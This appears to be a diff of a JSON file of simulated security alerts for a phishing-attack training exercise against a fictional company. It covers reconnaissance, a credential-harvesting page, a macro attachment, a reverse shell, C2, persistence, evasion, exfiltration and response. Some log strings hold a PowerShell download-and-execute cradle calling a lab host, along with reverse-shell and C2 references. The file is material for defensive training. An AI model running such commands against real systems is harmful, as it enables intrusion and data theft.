@@ -1,26 +1,320 @@
 {
-  "curl": [
+  "osint": [
     {
+      "id": "osint_domain_enumeration",
       "severity": "INFO",
-      "message": "OSINT request — HTTP probe to mail server",
-      "raw_log": "[SMTP] 172.20.3.20 — Connection from {src_ip} — EHLO probe",
-      "mitre_technique": "T1596"
-    }
-  ],
-  "nmap": [
+      "message": "OSINT reconnaissance — Domain enumeration for Orion Logistics",
+      "raw_log": "[DNS] Query from {src_ip}: orion-logistics.com, orion-logistics.sim, mail.orion-logistics.sim",
+      "mitre_technique": "T1598",
+      "cwe": "CWE-200"
+    },
     {
+      "id": "osint_mail_probe",
+      "severity": "INFO",
+      "message": "OSINT activity — SMTP probe to mail server",
+      "raw_log": "[SMTP] Connection from {src_ip} — EHLO orion-logistics.sim — Version info requested",
+      "mitre_technique": "T1596",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "osint_port_scan",
       "severity": "MED",
-      "message": "Port scan against mail infrastructure — SMTP/IMAP ports enumerated",
-      "raw_log": "[SMTP] Rate limit triggered — {src_ip} — 5+ connection attempts in 10s",
-      "mitre_technique": "T1046"
+      "message": "Port scan against mail infrastructure — SMTP/IMAP enumeration",
+      "raw_log": "[FIREWALL] Port scan from {src_ip} — 25/25 (SMTP), 587/587 (SMTP-TLS), 143/143 (IMAP) — Rate limit triggered",
+      "mitre_technique": "T1046",
+      "cwe": "CWE-200"
     }
   ],
-  "shell": [
+  "campaign_preparation": [
     {
-      "severity": "INFO",
-      "message": "GoPhish campaign activity detected — tracking pixel loaded",
-      "raw_log": "[GOPHISH] Email opened by target-ws-sc03 — Campaign: Orion_Q4_Invoice — Time: {ts}",
-      "mitre_technique": "T1566"
+      "id": "campaign_admin_access",
+      "severity": "LOW",
+      "message": "GoPhish admin panel accessed — campaign preparation in progress",
+      "raw_log": "[GOPHISH] Admin login at 172.20.3.10:3333 from {src_ip} — Session started",
+      "mitre_technique": "T1583.006",
+      "cwe": null
+    },
+    {
+      "id": "campaign_landing_page_created",
+      "severity": "MED",
+      "message": "Credential harvesting landing page created — targets Orion domain",
+      "raw_log": "[GOPHISH] New landing page: 'Orion MFA Enrollment' — Clones: outlook.office365.com",
+      "mitre_technique": "T1598.003",
+      "cwe": "CWE-601"
+    },
+    {
+      "id": "campaign_target_list_imported",
+      "severity": "MED",
+      "message": "Target user list imported — 3 users: helpdesk@orion-logistics.sim, finance@orion-logistics.sim, admin@orion-logistics.sim",
+      "raw_log": "[GOPHISH] Campaign created: 'Orion_Security_Alert' — Recipients: 3 — Sending profile: SMTP relay",
+      "mitre_technique": "T1598",
+      "cwe": "CWE-451"
+    }
+  ],
+  "email_campaign": [
+    {
+      "id": "campaign_launch",
+      "severity": "HIGH",
+      "message": "Phishing campaign launched — mass email dispatch to Orion employees",
+      "raw_log": "[SMTP] Campaign 'Orion_Security_Alert' launched from {src_ip} — 3 emails queued — Sending via 172.20.3.20:25",
+      "mitre_technique": "T1566.002",
+      "cwe": "CWE-451"
+    },
+    {
+      "id": "email_dispatch_event",
+      "severity": "MED",
+      "message": "Phishing email dispatched — macro-enabled document attached",
+      "raw_log": "[MAILRELAY] SMTP from 172.20.3.10 to target-ws-sc03 — Subject: 'URGENT: Security Update Required' — Attachment: SecurityUpdate.docm",
+      "mitre_technique": "T1566.001",
+      "cwe": "CWE-434"
+    },
+    {
+      "id": "email_with_suspicious_sender",
+      "severity": "HIGH",
+      "message": "Email gateway alert — suspicious sender domain (typosquat/lookalike)",
+      "raw_log": "[EMAIL_GATEWAY] Alert — Sender: it-security@orion-l0gistics.sim (LOOKALIKE) — Recipient: helpdesk@orion-logistics.sim — From external",
+      "mitre_technique": "T1598.003",
+      "cwe": "CWE-601"
+    },
+    {
+      "id": "email_with_macro",
+      "severity": "CRITICAL",
+      "message": "Malicious attachment detected — Office document with macro",
+      "raw_log": "[ATTACHMENT_SCANNER] File: SecurityUpdate.docm — Type: Office macro-enabled — Heuristic: Obfuscated VBA — Action: Flagged",
+      "mitre_technique": "T1566.001",
+      "cwe": "CWE-434"
+    }
+  ],
+  "email_interactions": [
+    {
+      "id": "email_open_tracking",
+      "severity": "MED",
+      "message": "Phishing email opened — tracking pixel loaded",
+      "raw_log": "[GOPHISH] Email opened by target-ws-sc03 (helpdesk user) — Campaign: Orion_Security_Alert — Time: 2026-04-10T14:23:45Z",
+      "mitre_technique": "T1598.003",
+      "cwe": null
+    },
+    {
+      "id": "phishing_link_click",
+      "severity": "HIGH",
+      "message": "Phishing link clicked — victim accessed credential harvesting page",
+      "raw_log": "[GOPHISH] Link clicked from target-ws-sc03 — URL: http://172.20.3.10/landing/?cid=campaign001 — Referer: Outlook — Time: 2026-04-10T14:24:12Z",
+      "mitre_technique": "T1598.003",
+      "cwe": "CWE-601"
+    },
+    {
+      "id": "credential_submission",
+      "severity": "CRITICAL",
+      "message": "Credentials submitted to phishing landing page",
+      "raw_log": "[GOPHISH] Form submission from target-ws-sc03 — Fields: username, password, mfa_code — Landing page: 'Orion MFA Enrollment'",
+      "mitre_technique": "T1598.003",
+      "cwe": "CWE-522"
+    }
+  ],
+  "payload_execution": [
+    {
+      "id": "macro_execution_detected",
+      "severity": "CRITICAL",
+      "message": "Office macro execution detected — reverse shell callback imminent",
+      "raw_log": "[ENDPOINT_DETECTION] Process: winword.exe — Child process: powershell.exe — Command: 'IEX(New-Object Net.WebClient).DownloadString(http://172.20.3.10/callback)' — Obfuscated",
+      "mitre_technique": "T1203",
+      "cwe": "CWE-95"
+    },
+    {
+      "id": "vba_obfuscation_detected",
+      "severity": "HIGH",
+      "message": "VBA macro with obfuscation/encoding detected — likely malicious intent",
+      "raw_log": "[OFFICE_MACRO_SCANNER] File: SecurityUpdate.docm — Macro: Base64 encoded command execution — Variable names: random strings",
+      "mitre_technique": "T1027",
+      "cwe": "CWE-95"
+    },
+    {
+      "id": "document_opened",
+      "severity": "MED",
+      "message": "Macro-enabled document opened by user — macro execution enabled",
+      "raw_log": "[ENDPOINT] User action: SecurityUpdate.docm opened — File location: C:\\Users\\helpdesk\\Downloads — Macro execution: Enabled",
+      "mitre_technique": "T1204.002",
+      "cwe": "CWE-434"
+    }
+  ],
+  "callback_activity": [
+    {
+      "id": "outbound_callback",
+      "severity": "CRITICAL",
+      "message": "Suspicious outbound connection detected — possible C2 callback",
+      "raw_log": "[FIREWALL] Alert — Outbound TCP from target-ws-sc03 (172.20.3.30) to 172.20.3.10:4444 — Process: powershell.exe — Connection type: reverse shell",
+      "mitre_technique": "T1071.001",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "reverse_shell_established",
+      "severity": "CRITICAL",
+      "message": "Reverse shell callback established — attacker gained code execution",
+      "raw_log": "[ENDPOINT] Process: powershell.exe — Established connection to {src_ip}:4444 — PID: 5432 — Parent: winword.exe",
+      "mitre_technique": "T1059.001",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "c2_communication",
+      "severity": "CRITICAL",
+      "message": "C2 command execution detected — remote commands being executed on endpoint",
+      "raw_log": "[ENDPOINT_EDR] Alert — Suspicious activity on target-ws-sc03 — Process: powershell.exe executing: 'whoami', 'ipconfig', 'systeminfo'",
+      "mitre_technique": "T1071.001",
+      "cwe": "CWE-200"
+    }
+  ],
+  "c2_communication": [
+    {
+      "id": "dns_query_c2_domain",
+      "severity": "HIGH",
+      "message": "Suspicious DNS query — C2 domain lookup detected",
+      "raw_log": "[DNS] Query from target-ws-sc03 (172.20.3.30) → c2-attacker.xyz — Type: A record",
+      "mitre_technique": "T1071.004",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "http_beacon_activity",
+      "severity": "CRITICAL",
+      "message": "HTTP beacon — C2 callback with system information exfiltration",
+      "raw_log": "[FIREWALL] Outbound HTTP POST from target-ws-sc03 to {src_ip}:8080 — Data: systeminfo, ipconfig output",
+      "mitre_technique": "T1071.001",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "dga_domain_query",
+      "severity": "HIGH",
+      "message": "DGA (Domain Generation Algorithm) query pattern — multiple non-existent domains",
+      "raw_log": "[DNS] Multiple failed queries from target-ws-sc03 — Domains: xyzabc123.com, xyzabc124.com, xyzabc125.com",
+      "mitre_technique": "T1568",
+      "cwe": "CWE-200"
+    }
+  ],
+  "persistence": [
+    {
+      "id": "scheduled_task_created",
+      "severity": "CRITICAL",
+      "message": "Scheduled task created — persistence mechanism installed",
+      "raw_log": "[ENDPOINT_EVENT] Scheduled Task Created — Name: WindowsUpdate_Check — Command: powershell.exe -c reverse_shell — Trigger: Daily 3:00 AM",
+      "mitre_technique": "T1053.005",
+      "cwe": "CWE-276"
+    },
+    {
+      "id": "registry_run_key_modified",
+      "severity": "CRITICAL",
+      "message": "Registry Run key modified — startup persistence",
+      "raw_log": "[ENDPOINT_REG] Registry Modified — HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — Value: svchost — Data: C:\\Windows\\Temp\\malware.exe",
+      "mitre_technique": "T1547.001",
+      "cwe": "CWE-276"
+    },
+    {
+      "id": "wmi_event_subscription",
+      "severity": "CRITICAL",
+      "message": "WMI Event Subscription created — fileless persistence",
+      "raw_log": "[ENDPOINT] WMI Subscription — EventFilter: LogonStartup — Consumer: CommandLineEventConsumer — Command: powershell.exe reverse_shell",
+      "mitre_technique": "T1547.020",
+      "cwe": "CWE-276"
+    },
+    {
+      "id": "startup_folder_modification",
+      "severity": "HIGH",
+      "message": "Startup folder modified — .lnk file added",
+      "raw_log": "[ENDPOINT_FILE] File Created — C:\\Users\\helpdesk\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.lnk",
+      "mitre_technique": "T1547.001",
+      "cwe": "CWE-276"
+    }
+  ],
+  "defense_evasion": [
+    {
+      "id": "tamper_protection_disabled",
+      "severity": "CRITICAL",
+      "message": "Tamper Protection disabled — Windows Defender disabled",
+      "raw_log": "[ENDPOINT] Windows Defender Tamper Protection disabled by user/script",
+      "mitre_technique": "T1562.001",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "realtime_protection_off",
+      "severity": "CRITICAL",
+      "message": "Real-time protection disabled — antivirus scanning offline",
+      "raw_log": "[DEFENDER] Real-Time Protection disabled — Change made by: powershell.exe",
+      "mitre_technique": "T1562.001",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "firewall_rule_added",
+      "severity": "HIGH",
+      "message": "Windows Firewall rule added — allow outbound traffic to C2",
+      "raw_log": "[FIREWALL] Rule Created — Name: Allow_Updates — Direction: Outbound — RemoteAddress: {src_ip}:4444",
+      "mitre_technique": "T1562.004",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "event_log_cleared",
+      "severity": "CRITICAL",
+      "message": "Windows Event Log cleared — forensic evidence destruction",
+      "raw_log": "[EVENTLOG] Security event log cleared — All events before 2026-04-10 14:00:00 deleted",
+      "mitre_technique": "T1070.001",
+      "cwe": "CWE-200"
+    }
+  ],
+  "exfiltration": [
+    {
+      "id": "data_staging",
+      "severity": "HIGH",
+      "message": "Data staging — files copied to temp directory",
+      "raw_log": "[ENDPOINT_FILE] Files Copied — Source: C:\\Users\\helpdesk\\Documents\\*.xlsx — Destination: C:\\Windows\\Temp\\",
+      "mitre_technique": "T1074.001",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "unusual_outbound_transfer",
+      "severity": "CRITICAL",
+      "message": "Unusual outbound data transfer — large volume to external IP",
+      "raw_log": "[FIREWALL] High-volume outbound traffic — target-ws-sc03 to {src_ip}:443 — 145MB transferred in 120s",
+      "mitre_technique": "T1041",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "compression_before_exfil",
+      "severity": "HIGH",
+      "message": "Data compression detected — preparation for exfiltration",
+      "raw_log": "[ENDPOINT_PROCESS] Process: 7z.exe — Command: 7z.exe a -p password C:\\Windows\\Temp\\backup.7z Documents/",
+      "mitre_technique": "T1560",
+      "cwe": "CWE-200"
+    }
+  ],
+  "ir_response": [
+    {
+      "id": "user_reported_phishing",
+      "severity": "MED",
+      "message": "User reported phishing email — manual identification by employee",
+      "raw_log": "[SECURITY] User helpdesk@orion-logistics.sim reported suspicious email — Subject: 'URGENT: Security Update Required' — Sender: it-security@orion-l0gistics.sim",
+      "mitre_technique": null,
+      "cwe": null
+    },
+    {
+      "id": "ir_ticket_created",
+      "severity": "HIGH",
+      "message": "Incident Response ticket created — phishing campaign investigation initiated",
+      "raw_log": "[TICKETING] Ticket #SC03001 created — Type: Phishing Attack — Status: Investigation — Assigned to: SOC Team",
+      "mitre_technique": null,
+      "cwe": null
+    },
+    {
+      "id": "domain_block_action",
+      "severity": "HIGH",
+      "message": "Phishing sender domain blocked — email gateway rule updated",
+      "raw_log": "[EMAIL_GATEWAY] Action taken — Blocked domain: orion-l0gistics.sim — Added to block list — Alert rule: Reject similar typosquats",
+      "mitre_technique": null,
+      "cwe": null
+    },
+    {
+      "id": "endpoint_remediation",
+      "severity": "HIGH",
+      "message": "Affected endpoint remediation initiated — reverse shell process terminated",
+      "raw_log": "[ENDPOINT_REMEDIATION] target-ws-sc03 — Process powershell.exe (PID 5432) — Action: Terminated — Isolation: Initiated — Evidence collection: Completed",
+      "mitre_technique": null,
+      "cwe": null
     }
   ]
 }
